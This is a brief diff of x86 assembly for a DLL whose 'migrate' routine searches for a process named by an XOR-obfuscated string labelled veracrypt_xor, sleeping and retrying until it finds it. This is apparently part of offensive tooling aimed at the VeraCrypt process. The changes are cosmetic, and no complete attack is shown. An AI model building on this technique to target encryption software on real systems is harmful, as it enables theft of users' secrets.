@@ -9,6 +9,7 @@ export migrate
 %include '..\utils_32_text.asm'
 
 migrate:
+; int3
     push ebp
     mov ebp, esp
 
@@ -46,7 +47,7 @@ migrate:
     push veracrypt_xor
     call find_target_process_id
 
-    cmp eax, 0                          ; processe not found ?
+    cmp eax, 0                          ; process not found ?
     jne .loop_end
 
     push dword 5000                     ; milliseconds to sleep for
@@ -256,7 +257,7 @@ DllMain:
 
 .continue_from_process_detach:
 .shutdown:
-    mov eax, 1
+    mov eax, 1                      ; return value
 
     add esp, 12                     ; free arg stack
 
@@ -274,3 +275,4 @@ veracrypt_xor: db 0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x
 %include '../utils_32_data.asm'
 
 section .bss
+%include '../utils_32_bss.asm'
